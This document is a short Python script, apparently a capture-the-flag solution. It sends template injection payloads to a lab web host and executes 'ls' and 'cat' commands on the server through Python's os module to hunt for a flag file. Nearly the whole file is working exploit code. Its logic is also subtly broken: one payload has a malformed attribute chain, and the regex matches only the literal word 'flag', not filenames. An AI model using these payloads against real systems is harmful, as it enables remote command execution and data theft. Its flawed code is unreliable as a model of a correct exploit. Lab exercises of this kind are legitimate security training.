#!/usr/bin/env python3
import requests
import html
import re

# initializing link and payload content
target_link = "http://xebec.cylabacademy.net:[insertsessionid]"
package = "{{self.__.__init__.__globals__.__builtins__.__import__('os').popen('ls').read()}}"

# attempting to deliver payload and check for successful status code
r = requests.post(target_link, data={"content":package})

# take all files with 'flag' in the name and add them to a list, then print the length of that list
if r.status_code == 200:
	files = r.text # take 
	decoded_files = html.unescape(files)
	filenames = re.findall(r"flag", decoded_files)
	print (len(filenames))

	# go through all files in the list and attempt to print their contents, searching for the flag
	for i in range(0, len(filenames)):
		
		new_package = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat " + filenames[i] + " ').read()}}"
		nr = requests.post(target_link, data={"content":new_package})
		if nr.status_code == 200 and filenames[i] == "flag":
			print (nr.text)
			print ("*"*30)
			print ("filename: ", filenames[i], "index: ", i)
			exit(0)
else:
	print ("nothing here boss " + str(r.status_code))
